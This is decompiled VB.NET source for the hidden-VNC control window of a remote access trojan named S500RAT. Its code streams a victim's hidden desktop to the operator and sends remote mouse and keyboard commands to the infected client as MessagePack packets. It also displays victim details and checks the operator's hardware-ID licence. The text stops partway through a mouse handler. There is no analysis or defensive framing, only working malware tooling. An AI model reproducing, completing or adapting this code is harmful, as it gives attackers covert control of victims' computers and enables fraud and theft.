Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms
Imports Guna.UI2.WinForms
Imports Guna.UI2.WinForms.Enums
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports S.StreamLibrary
Imports S.StreamLibrary.UnsafeCodecs
Imports S500RAT.My.Resources
Imports S500RAT.Server
Imports S500RAT.Server.Connection
Imports Sunny.UI

Namespace S500RAT
	' Token: 0x0200001F RID: 31
	<DesignerGenerated()>
	Public Partial Class FormHVNC
		Inherits Form

		' Token: 0x06000516 RID: 1302 RVA: 0x0002C4E0 File Offset: 0x0002A6E0
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.FormHVNC_Load
			AddHandler MyBase.Resize, AddressOf Me.FormHVNC_Resize
			Me.FormSize = False
			Me.IntFPS = 0
			Me.sw = Stopwatch.StartNew()
			Me.decoder = New UnsafeStreamCodec(60, True)
			Me.syncPicbox = RuntimeHelpers.GetObjectValue(New Object())
			Me.InitializeComponent()
		End Sub

		' Token: 0x17000211 RID: 529
		' (get) Token: 0x06000519 RID: 1305 RVA: 0x0002DE76 File Offset: 0x0002C076
		' (set) Token: 0x0600051A RID: 1306 RVA: 0x0002DE80 File Offset: 0x0002C080
		Friend Overridable Property Timer1 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As System.Windows.Forms.Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x17000212 RID: 530
		' (get) Token: 0x0600051B RID: 1307 RVA: 0x0002DEC3 File Offset: 0x0002C0C3
		' (set) Token: 0x0600051C RID: 1308 RVA: 0x0002DECD File Offset: 0x0002C0CD
		Friend Overridable Property UiLabel1 As UILabel

		' Token: 0x17000213 RID: 531
		' (get) Token: 0x0600051D RID: 1309 RVA: 0x0002DED6 File Offset: 0x0002C0D6
		' (set) Token: 0x0600051E RID: 1310 RVA: 0x0002DEE0 File Offset: 0x0002C0E0
		Private Overridable Property ClientInfo As Label

		' Token: 0x17000214 RID: 532
		' (get) Token: 0x0600051F RID: 1311 RVA: 0x0002DEE9 File Offset: 0x0002C0E9
		' (set) Token: 0x06000520 RID: 1312 RVA: 0x0002DEF3 File Offset: 0x0002C0F3
		Friend Overridable Property Guna2ResizeBox1 As Guna2ResizeBox

		' Token: 0x17000215 RID: 533
		' (get) Token: 0x06000521 RID: 1313 RVA: 0x0002DEFC File Offset: 0x0002C0FC
		' (set) Token: 0x06000522 RID: 1314 RVA: 0x0002DF08 File Offset: 0x0002C108
		Public Overridable Property StartAndStop As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._StartAndStop
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.StartAndStop_Click
				Dim startAndStop As Guna2GradientButton = Me._StartAndStop
				If startAndStop IsNot Nothing Then
					RemoveHandler startAndStop.Click, value2
				End If
				Me._StartAndStop = value
				startAndStop = Me._StartAndStop
				If startAndStop IsNot Nothing Then
					AddHandler startAndStop.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000216 RID: 534
		' (get) Token: 0x06000523 RID: 1315 RVA: 0x0002DF4B File Offset: 0x0002C14B
		' (set) Token: 0x06000524 RID: 1316 RVA: 0x0002DF55 File Offset: 0x0002C155
		Public Overridable Property StateHvnc As Label

		' Token: 0x17000217 RID: 535
		' (get) Token: 0x06000525 RID: 1317 RVA: 0x0002DF5E File Offset: 0x0002C15E
		' (set) Token: 0x06000526 RID: 1318 RVA: 0x0002DF68 File Offset: 0x0002C168
		Friend Overridable Property PictureBox1 As PictureBox
			<CompilerGenerated()>
			Get
				Return Me._PictureBox1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Dim value2 As MouseEventHandler = AddressOf Me.PictureBox1_MouseMove
				Dim value3 As MouseEventHandler = AddressOf Me.PictureBox1_MouseDown
				Dim value4 As MouseEventHandler = AddressOf Me.PictureBox1_MouseUp
				Dim pictureBox As PictureBox = Me._PictureBox1
				If pictureBox IsNot Nothing Then
					RemoveHandler pictureBox.MouseMove, value2
					RemoveHandler pictureBox.MouseDown, value3
					RemoveHandler pictureBox.MouseUp, value4
				End If
				Me._PictureBox1 = value
				pictureBox = Me._PictureBox1
				If pictureBox IsNot Nothing Then
					AddHandler pictureBox.MouseMove, value2
					AddHandler pictureBox.MouseDown, value3
					AddHandler pictureBox.MouseUp, value4
				End If
			End Set
		End Property

		' Token: 0x17000218 RID: 536
		' (get) Token: 0x06000527 RID: 1319 RVA: 0x0002DFE1 File Offset: 0x0002C1E1
		' (set) Token: 0x06000528 RID: 1320 RVA: 0x0002DFEC File Offset: 0x0002C1EC
		Friend Overridable Property Timer2 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer2
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer2_Tick
				Dim timer As System.Windows.Forms.Timer = Me._Timer2
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer2 = value
				timer = Me._Timer2
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x17000219 RID: 537
		' (get) Token: 0x06000529 RID: 1321 RVA: 0x0002E02F File Offset: 0x0002C22F
		' (set) Token: 0x0600052A RID: 1322 RVA: 0x0002E039 File Offset: 0x0002C239
		Friend Overridable Property ImageList1 As ImageList

		' Token: 0x1700021A RID: 538
		' (get) Token: 0x0600052B RID: 1323 RVA: 0x0002E042 File Offset: 0x0002C242
		' (set) Token: 0x0600052C RID: 1324 RVA: 0x0002E04C File Offset: 0x0002C24C
		Friend Overridable Property Conx As ContextMenuStrip

		' Token: 0x1700021B RID: 539
		' (get) Token: 0x0600052D RID: 1325 RVA: 0x0002E055 File Offset: 0x0002C255
		' (set) Token: 0x0600052E RID: 1326 RVA: 0x0002E05F File Offset: 0x0002C25F
		Friend Overridable Property ToolStripMenuItem1 As ToolStripMenuItem

		' Token: 0x1700021C RID: 540
		' (get) Token: 0x0600052F RID: 1327 RVA: 0x0002E068 File Offset: 0x0002C268
		' (set) Token: 0x06000530 RID: 1328 RVA: 0x0002E074 File Offset: 0x0002C274
		Friend Overridable Property ToolStripMenuItem3 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._ToolStripMenuItem3
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem3_Click
				Dim toolStripMenuItem As ToolStripMenuItem = Me._ToolStripMenuItem3
				If toolStripMenuItem IsNot Nothing Then
					RemoveHandler toolStripMenuItem.Click, value2
				End If
				Me._ToolStripMenuItem3 = value
				toolStripMenuItem = Me._ToolStripMenuItem3
				If toolStripMenuItem IsNot Nothing Then
					AddHandler toolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700021D RID: 541
		' (get) Token: 0x06000531 RID: 1329 RVA: 0x0002E0B7 File Offset: 0x0002C2B7
		' (set) Token: 0x06000532 RID: 1330 RVA: 0x0002E0C4 File Offset: 0x0002C2C4
		Friend Overridable Property ToolStripMenuItem5 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._ToolStripMenuItem5
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem5_Click
				Dim toolStripMenuItem As ToolStripMenuItem = Me._ToolStripMenuItem5
				If toolStripMenuItem IsNot Nothing Then
					RemoveHandler toolStripMenuItem.Click, value2
				End If
				Me._ToolStripMenuItem5 = value
				toolStripMenuItem = Me._ToolStripMenuItem5
				If toolStripMenuItem IsNot Nothing Then
					AddHandler toolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700021E RID: 542
		' (get) Token: 0x06000533 RID: 1331 RVA: 0x0002E107 File Offset: 0x0002C307
		' (set) Token: 0x06000534 RID: 1332 RVA: 0x0002E114 File Offset: 0x0002C314
		Friend Overridable Property ToolStripMenuItem6 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._ToolStripMenuItem6
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem6_Click
				Dim toolStripMenuItem As ToolStripMenuItem = Me._ToolStripMenuItem6
				If toolStripMenuItem IsNot Nothing Then
					RemoveHandler toolStripMenuItem.Click, value2
				End If
				Me._ToolStripMenuItem6 = value
				toolStripMenuItem = Me._ToolStripMenuItem6
				If toolStripMenuItem IsNot Nothing Then
					AddHandler toolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700021F RID: 543
		' (get) Token: 0x06000535 RID: 1333 RVA: 0x0002E157 File Offset: 0x0002C357
		' (set) Token: 0x06000536 RID: 1334 RVA: 0x0002E164 File Offset: 0x0002C364
		Friend Overridable Property ToolStripMenuItem7 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._ToolStripMenuItem7
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem7_Click
				Dim toolStripMenuItem As ToolStripMenuItem = Me._ToolStripMenuItem7
				If toolStripMenuItem IsNot Nothing Then
					RemoveHandler toolStripMenuItem.Click, value2
				End If
				Me._ToolStripMenuItem7 = value
				toolStripMenuItem = Me._ToolStripMenuItem7
				If toolStripMenuItem IsNot Nothing Then
					AddHandler toolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000220 RID: 544
		' (get) Token: 0x06000537 RID: 1335 RVA: 0x0002E1A7 File Offset: 0x0002C3A7
		' (set) Token: 0x06000538 RID: 1336 RVA: 0x0002E1B4 File Offset: 0x0002C3B4
		Friend Overridable Property ToolStripMenuItem8 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._ToolStripMenuItem8
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem8_Click
				Dim toolStripMenuItem As ToolStripMenuItem = Me._ToolStripMenuItem8
				If toolStripMenuItem IsNot Nothing Then
					RemoveHandler toolStripMenuItem.Click, value2
				End If
				Me._ToolStripMenuItem8 = value
				toolStripMenuItem = Me._ToolStripMenuItem8
				If toolStripMenuItem IsNot Nothing Then
					AddHandler toolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000221 RID: 545
		' (get) Token: 0x06000539 RID: 1337 RVA: 0x0002E1F7 File Offset: 0x0002C3F7
		' (set) Token: 0x0600053A RID: 1338 RVA: 0x0002E204 File Offset: 0x0002C404
		Friend Overridable Property ToolStripMenuItem9 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._ToolStripMenuItem9
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem9_Click
				Dim toolStripMenuItem As ToolStripMenuItem = Me._ToolStripMenuItem9
				If toolStripMenuItem IsNot Nothing Then
					RemoveHandler toolStripMenuItem.Click, value2
				End If
				Me._ToolStripMenuItem9 = value
				toolStripMenuItem = Me._ToolStripMenuItem9
				If toolStripMenuItem IsNot Nothing Then
					AddHandler toolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000222 RID: 546
		' (get) Token: 0x0600053B RID: 1339 RVA: 0x0002E247 File Offset: 0x0002C447
		' (set) Token: 0x0600053C RID: 1340 RVA: 0x0002E254 File Offset: 0x0002C454
		Friend Overridable Property ToolStripMenuItem10 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._ToolStripMenuItem10
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem10_Click
				Dim toolStripMenuItem As ToolStripMenuItem = Me._ToolStripMenuItem10
				If toolStripMenuItem IsNot Nothing Then
					RemoveHandler toolStripMenuItem.Click, value2
				End If
				Me._ToolStripMenuItem10 = value
				toolStripMenuItem = Me._ToolStripMenuItem10
				If toolStripMenuItem IsNot Nothing Then
					AddHandler toolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000223 RID: 547
		' (get) Token: 0x0600053D RID: 1341 RVA: 0x0002E297 File Offset: 0x0002C497
		' (set) Token: 0x0600053E RID: 1342 RVA: 0x0002E2A1 File Offset: 0x0002C4A1
		Friend Overridable Property ToolStripMenuItem13 As ToolStripMenuItem

		' Token: 0x17000224 RID: 548
		' (get) Token: 0x0600053F RID: 1343 RVA: 0x0002E2AA File Offset: 0x0002C4AA
		' (set) Token: 0x06000540 RID: 1344 RVA: 0x0002E2B4 File Offset: 0x0002C4B4
		Friend Overridable Property CopyText As ToolStripMenuItem

		' Token: 0x17000225 RID: 549
		' (get) Token: 0x06000541 RID: 1345 RVA: 0x0002E2BD File Offset: 0x0002C4BD
		' (set) Token: 0x06000542 RID: 1346 RVA: 0x0002E2C7 File Offset: 0x0002C4C7
		Friend Overridable Property PasteText As ToolStripMenuItem

		' Token: 0x17000226 RID: 550
		' (get) Token: 0x06000543 RID: 1347 RVA: 0x0002E2D0 File Offset: 0x0002C4D0
		' (set) Token: 0x06000544 RID: 1348 RVA: 0x0002E2DA File Offset: 0x0002C4DA
		Friend Overridable Property MenuStrip1 As MenuStrip

		' Token: 0x17000227 RID: 551
		' (get) Token: 0x06000545 RID: 1349 RVA: 0x0002E2E3 File Offset: 0x0002C4E3
		' (set) Token: 0x06000546 RID: 1350 RVA: 0x0002E2F0 File Offset: 0x0002C4F0
		Friend Overridable Property SetingToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._SetingToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.SetingToolStripMenuItem_Click
				Dim setingToolStripMenuItem As ToolStripMenuItem = Me._SetingToolStripMenuItem
				If setingToolStripMenuItem IsNot Nothing Then
					RemoveHandler setingToolStripMenuItem.Click, value2
				End If
				Me._SetingToolStripMenuItem = value
				setingToolStripMenuItem = Me._SetingToolStripMenuItem
				If setingToolStripMenuItem IsNot Nothing Then
					AddHandler setingToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000228 RID: 552
		' (get) Token: 0x06000547 RID: 1351 RVA: 0x0002E333 File Offset: 0x0002C533
		' (set) Token: 0x06000548 RID: 1352 RVA: 0x0002E33D File Offset: 0x0002C53D
		Friend Overridable Property Quality As Guna2HtmlLabel

		' Token: 0x17000229 RID: 553
		' (get) Token: 0x06000549 RID: 1353 RVA: 0x0002E346 File Offset: 0x0002C546
		' (set) Token: 0x0600054A RID: 1354 RVA: 0x0002E350 File Offset: 0x0002C550
		Friend Overridable Property QualityUsing As Guna2TrackBar
			<CompilerGenerated()>
			Get
				Return Me._QualityUsing
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2TrackBar)
				Dim value2 As ScrollEventHandler = AddressOf Me.QualityUsing_Scroll
				Dim qualityUsing As Guna2TrackBar = Me._QualityUsing
				If qualityUsing IsNot Nothing Then
					RemoveHandler qualityUsing.Scroll, value2
				End If
				Me._QualityUsing = value
				qualityUsing = Me._QualityUsing
				If qualityUsing IsNot Nothing Then
					AddHandler qualityUsing.Scroll, value2
				End If
			End Set
		End Property

		' Token: 0x1700022A RID: 554
		' (get) Token: 0x0600054B RID: 1355 RVA: 0x0002E393 File Offset: 0x0002C593
		' (set) Token: 0x0600054C RID: 1356 RVA: 0x0002E39D File Offset: 0x0002C59D
		Friend Overridable Property SizeImage As Label

		' Token: 0x1700022B RID: 555
		' (get) Token: 0x0600054D RID: 1357 RVA: 0x0002E3A6 File Offset: 0x0002C5A6
		' (set) Token: 0x0600054E RID: 1358 RVA: 0x0002E3B0 File Offset: 0x0002C5B0
		Private Overridable Property Label2 As Label

		' Token: 0x1700022C RID: 556
		' (get) Token: 0x0600054F RID: 1359 RVA: 0x0002E3B9 File Offset: 0x0002C5B9
		' (set) Token: 0x06000550 RID: 1360 RVA: 0x0002E3C3 File Offset: 0x0002C5C3
		Friend Overridable Property FPS As Label

		' Token: 0x1700022D RID: 557
		' (get) Token: 0x06000551 RID: 1361 RVA: 0x0002E3CC File Offset: 0x0002C5CC
		' (set) Token: 0x06000552 RID: 1362 RVA: 0x0002E3D6 File Offset: 0x0002C5D6
		Private Overridable Property Label4 As Label

		' Token: 0x1700022E RID: 558
		' (get) Token: 0x06000553 RID: 1363 RVA: 0x0002E3DF File Offset: 0x0002C5DF
		' (set) Token: 0x06000554 RID: 1364 RVA: 0x0002E3E9 File Offset: 0x0002C5E9
		Friend Overridable Property Mini As ValleyMini

		' Token: 0x1700022F RID: 559
		' (get) Token: 0x06000555 RID: 1365 RVA: 0x0002E3F2 File Offset: 0x0002C5F2
		' (set) Token: 0x06000556 RID: 1366 RVA: 0x0002E3FC File Offset: 0x0002C5FC
		Friend Overridable Property MAX As ValleyMax

		' Token: 0x17000230 RID: 560
		' (get) Token: 0x06000557 RID: 1367 RVA: 0x0002E405 File Offset: 0x0002C605
		' (set) Token: 0x06000558 RID: 1368 RVA: 0x0002E410 File Offset: 0x0002C610
		Friend Overridable Property ExitForm As ValleyClose
			<CompilerGenerated()>
			Get
				Return Me._ExitForm
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ValleyClose)
				Dim value2 As EventHandler = AddressOf Me.ExitForm_Click
				Dim exitForm As ValleyClose = Me._ExitForm
				If exitForm IsNot Nothing Then
					RemoveHandler exitForm.Click, value2
				End If
				Me._ExitForm = value
				exitForm = Me._ExitForm
				If exitForm IsNot Nothing Then
					AddHandler exitForm.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000231 RID: 561
		' (get) Token: 0x06000559 RID: 1369 RVA: 0x0002E453 File Offset: 0x0002C653
		' (set) Token: 0x0600055A RID: 1370 RVA: 0x0002E45D File Offset: 0x0002C65D
		Friend Overridable Property Guna2DragControl1 As Guna2DragControl

		' Token: 0x17000232 RID: 562
		' (get) Token: 0x0600055B RID: 1371 RVA: 0x0002E466 File Offset: 0x0002C666
		' (set) Token: 0x0600055C RID: 1372 RVA: 0x0002E470 File Offset: 0x0002C670
		Friend Overridable Property Guna2BorderlessForm1 As Guna2BorderlessForm

		' Token: 0x17000233 RID: 563
		' (get) Token: 0x0600055D RID: 1373 RVA: 0x0002E479 File Offset: 0x0002C679
		' (set) Token: 0x0600055E RID: 1374 RVA: 0x0002E483 File Offset: 0x0002C683
		Public Property Client As Clients

		' Token: 0x17000234 RID: 564
		' (get) Token: 0x0600055F RID: 1375 RVA: 0x0002E48C File Offset: 0x0002C68C
		' (set) Token: 0x06000560 RID: 1376 RVA: 0x0002E496 File Offset: 0x0002C696
		Public Property F As FormS500

		' Token: 0x17000235 RID: 565
		' (get) Token: 0x06000561 RID: 1377 RVA: 0x0002E49F File Offset: 0x0002C69F
		' (set) Token: 0x06000562 RID: 1378 RVA: 0x0002E4A9 File Offset: 0x0002C6A9
		Public Property FullPath As String

		' Token: 0x17000236 RID: 566
		' (get) Token: 0x06000563 RID: 1379 RVA: 0x0002E4B2 File Offset: 0x0002C6B2
		' (set) Token: 0x06000564 RID: 1380 RVA: 0x0002E4BC File Offset: 0x0002C6BC
		Friend Property ParentClient As Clients

		' Token: 0x17000237 RID: 567
		' (get) Token: 0x06000565 RID: 1381 RVA: 0x0002E4C5 File Offset: 0x0002C6C5
		' (set) Token: 0x06000566 RID: 1382 RVA: 0x0002E4CF File Offset: 0x0002C6CF
		Public Property GetImage As Image

		' Token: 0x06000567 RID: 1383 RVA: 0x0002E4D8 File Offset: 0x0002C6D8
		Public Sub KDW(sender As Object, e As KeyPressEventArgs)
			Dim flag As Boolean = Operators.CompareString(Me.StartAndStop.Text, "Stop", False) = 0 AndAlso Me.PictureBox1 IsNot Nothing
			If flag Then
				Me.PictureBox1.Focus()
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "KeyboardDown"
				msgPack.ForcePathObject("Key").AsString = Convert.ToBase64String(Encoding.UTF8.GetBytes(Conversions.ToString(e.KeyChar)))
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			End If
		End Sub

		' Token: 0x06000568 RID: 1384 RVA: 0x0002E580 File Offset: 0x0002C780
		Private Sub FormHVNC_Load(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(APIH.GetHWID(Conversions.ToString(FormSC.GetPicpass())), FormSC.GetPickey(), False)))
				If flag Then
					MyBase.Close()
				End If
				Dim flag2 As Boolean = Operators.ConditionalCompareObjectEqual(APIH.GetHWID(Conversions.ToString(FormSC.GetPicpass())), FormSC.GetPickey(), False)
				If flag2 Then
					Setting.Running = True
				Else
					MyBase.Close()
				End If
				Dim flag3 As Boolean = Not Setting.Running
				If flag3 Then
					MyBase.Close()
				End If
			Catch ex As Exception
				MyBase.Close()
			End Try
			Dim pictureBox As PictureBox = Me.PictureBox1
			Dim obj As Object = pictureBox
			SyncLock obj
				Dim pictureBox2 As Control = Me.PictureBox1
				AddHandler pictureBox2.KeyPress, AddressOf Me.KDW
			End SyncLock
			Dim expression As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(DataB.InfoClient(Me.ParentClient.L)))
			Try
				Me.ClientInfo.Text = String.Concat(New String() { Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(1), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(2), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(3), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(4) })
			Catch ex2 As Exception
				Me.ClientInfo.Text = "Not found !"
			End Try
			Me.FormSize = True
			Me.MinimumSize = MyBase.Size
			Me.PictureBox1.Focus()
		End Sub

		' Token: 0x06000569 RID: 1385 RVA: 0x0002E760 File Offset: 0x0002C960
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Not Me.ParentClient.TcpClient.Connected OrElse Not Me.Client.TcpClient.Connected
				If flag Then
					MyBase.Close()
				End If
			Catch ex As Exception
				MyBase.Close()
			End Try
		End Sub

		' Token: 0x0600056A RID: 1386 RVA: 0x0002E7CC File Offset: 0x0002C9CC
		Private Sub ExitForm_Click(sender As Object, e As EventArgs)
			ThreadPool.QueueUserWorkItem(Sub(o As Object)
				Dim client As Clients = Me.Client
				If client IsNot Nothing Then
					client.Disconnected()
				End If
				MyBase.Close()
			End Sub)
		End Sub

		' Token: 0x0600056B RID: 1387 RVA: 0x0002E7E4 File Offset: 0x0002C9E4
		Private Sub FormHVNC_Resize(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.FormSize
			If flag Then
				Dim width As Integer = Screen.PrimaryScreen.Bounds.Width
				Dim height As Integer = Screen.PrimaryScreen.Bounds.Height
				Dim width2 As Integer = MyBase.Width
				Dim height2 As Integer = MyBase.Height
				Dim x As Integer = CInt(Math.Round(CDbl((width - width2)) / 2.0))
				Dim y As Integer = CInt(Math.Round(CDbl((height - height2)) / 2.0))
				MyBase.Location = New Point(x, y)
			End If
		End Sub

		' Token: 0x0600056C RID: 1388 RVA: 0x0002E878 File Offset: 0x0002CA78
		Private Sub StartAndStop_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Operators.CompareString(Me.StartAndStop.Text, "Start", False) = 0
				If flag Then
					Me.StartAndStop.Enabled = False
					Me.StartAndStop.Text = "Please wait ..."
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").AsString = "capture"
					msgPack.ForcePathObject("Quality").AsInteger = CLng(Convert.ToInt32(Me.QualityUsing.Value))
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
				Else
					Me.StartAndStop.Enabled = False
					Me.StartAndStop.Text = "Please wait ..."
					Dim msgPack2 As MsgPack = New MsgPack()
					msgPack2.ForcePathObject("Packet").AsString = "Stop"
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack2.Encode2Bytes())
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600056D RID: 1389 RVA: 0x0002E99C File Offset: 0x0002CB9C
		Private Sub PictureBox1_MouseMove(sender As Object, e As MouseEventArgs)
			Try
				Me.PictureBox1.Focus()
				Dim point As Point = New Point(CInt(Math.Round(CDbl((e.X * Me.rdSize.Width)) / CDbl(Me.PictureBox1.Width))), CInt(Math.Round(CDbl((e.Y * Me.rdSize.Height)) / CDbl(Me.PictureBox1.Height))))
				Dim flag As Boolean = Operators.CompareString(Me.StartAndStop.Text, "Stop", False) = 0 AndAlso Me.PictureBox1.Image IsNot Nothing
				If flag Then
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").AsString = "MouseMove"
					msgPack.ForcePathObject("X").AsInteger = CLng(point.X)
					msgPack.ForcePathObject("Y").AsInteger = CLng(point.Y)
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600056E RID: 1390 RVA: 0x0002EAC4 File Offset: 0x0002CCC4
		Private Sub PictureBox1_MouseDown(sender As Object, e As MouseEventArgs)
			Try
				Dim pictureBox As PictureBox = Me.PictureBox1
				Dim obj As Object = pictureBox
				SyncLock obj
					Dim flag2 As Boolean = Operators.CompareString(Me.StartAndStop.Text, "Stop", False) = 0 AndAlso Me.PictureBox1.Image IsNot Nothing
					If flag2 Then
						' The following expression was wrapped in a checked-expression
						Dim point As Point = New Point(CInt(Math.Round(CDbl((e.X * Me.rdSize.Width)) / CDbl(Me.PictureBox1.Width))), CInt(Math.Round(CDbl((e.Y * Me.rdSize.Height)) / CDbl(Me.PictureBox1.Height))))
						Dim flag3 As Boolean = Me.bool_1
						If flag3 Then
							Me.bool_1 = False
							Me.Timer2.Start()
						Else
							Dim flag4 As Boolean = Me.int_0 < SystemInformation.DoubleClickTime
							If flag4 Then
								Me.bool_2 = True
							End If
						End If
						Dim flag5 As Boolean = Me.bool_2
						If flag5 Then
							Dim flag6 As Boolean = e.Button = MouseButtons.Left
							If flag6 Then
								Dim msgPack As MsgPack = New MsgPack()
								msgPack.ForcePathObject("Packet").AsString = "MouseDoubleClick"
								msgPack.ForcePathObject("X").AsInteger = CLng(point.X)
								msgPack.ForcePathObject("Y").AsInteger = CLng(point.Y)
								ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
							End If
						Else
							Dim flag7 As Boolean = e.Button = MouseButtons.Left
							If flag7 Then
								Dim msgPack2 As MsgPack = New MsgPack()
								msgPack2.ForcePathObject("Packet").AsString = "MouseLeftDown"
								msgPack2.ForcePathObject("X").AsInteger = CLng(point.X)
								msgPack2.ForcePathObject("Y").AsInteger = CLng(point.Y)
								ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack2.Encode2Bytes())
							Else
								Dim flag8 As Boolean = e.Button = MouseButtons.Right
								If flag8 Then
									Dim msgPack3 As MsgPack = New MsgPack()
									msgPack3.ForcePathObject("Packet").AsString = "MouseRightDown"
									msgPack3.ForcePathObject("X").AsInteger = CLng(point.X)
									msgPack3.ForcePathObject("Y").AsInteger = CLng(point.Y)
									ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack3.Encode2Bytes())
								End If
							End If
						End If
					End If
				End SyncLock
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600056F RID: 1391 RVA: 0x0002EDAC File Offset: 0x0002CFAC
		Private Sub PictureBox1_MouseUp(sender As Object, e As MouseEventArgs)
			Try
				Dim pictureBox As PictureBox = Me.PictureBox1
				Dim obj As Object = pictureBox
				SyncLock obj
					Dim flag2 As Boolean = Operators.CompareString(Me.StartAndStop.Text, "Stop", False) = 0 AndAlso Me.PictureBox1.Image IsNot Nothing
					If flag2 Then
						' The following expression was wrapped in a checked-expression
						Dim point As Point = New Point(CInt(Math.Round(CDbl((e.X * Me.rdSize.Width)) / CDbl(Me.PictureBox1.Width))), CInt(Math.Round(CDbl((e.Y * Me.rdSize.Height)) / CDbl(Me.PictureBox1.Height))))
						Dim flag3 As Boolean = e.Button = MouseButtons.Left
						If flag3 Then
							Dim msgPack As MsgPack = New MsgPack()
